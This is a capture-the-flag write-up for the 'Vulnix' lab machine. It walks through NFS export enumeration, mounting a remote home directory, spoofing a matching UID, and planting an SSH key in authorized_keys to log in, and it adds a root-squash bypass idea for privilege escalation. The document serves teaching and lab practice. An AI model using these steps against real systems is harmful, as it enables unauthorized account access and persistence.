# Maq159: Vulnix

Writeup for the **Vulnix** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 159

---

## Overview

A Linux machine with misconfigured NFS exports that allow mounting home directories. By injecting an SSH public key into a user's authorized_keys, direct SSH access is gained without knowing the password.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Look for NFS (port 2049) and related RPC services. Enumerate NFS exports:

```bash
showmount -e [TARGET_IP]
```

The output should reveal exported directories, such as `/home/vulnix`.

## Exploitation

**Mount the NFS share:**

```bash
mkdir /tmp/vulnix
mount -t nfs [TARGET_IP]:/home/vulnix /tmp/vulnix
```

If permission denied due to UID mismatch, create a local user with the matching UID:

```bash
useradd -u [REMOTE_UID] tempuser
su tempuser
```

**Inject SSH key:**

```bash
mkdir /tmp/vulnix/.ssh
ssh-keygen -t rsa -f /tmp/vulnix/.ssh/id_rsa -N ""
cp /tmp/vulnix/.ssh/id_rsa.pub /tmp/vulnix/.ssh/authorized_keys
chmod 700 /tmp/vulnix/.ssh
chmod 600 /tmp/vulnix/.ssh/authorized_keys
```

**SSH in:**

```bash
ssh -i /tmp/vulnix/.ssh/id_rsa vulnix@[TARGET_IP]
```

## Privilege Escalation

Check sudo privileges and look for writable system files:

```bash
sudo -l
```

If the user can edit `/etc/exports`, add a root-squash bypass and re-export.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Remote Services: SSH | T1021.004 |
| Account Manipulation: SSH Authorized Keys | T1098.004 |
| Network Share Discovery | T1135 |

### CWE

- **CWE-276:** Incorrect Default Permissions
- **CWE-732:** Incorrect Permission Assignment for Critical Resource

---

NFS was designed for trust within a local network. When that trust extends to anyone who can reach port 2049, a single `mount` command becomes a master key.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
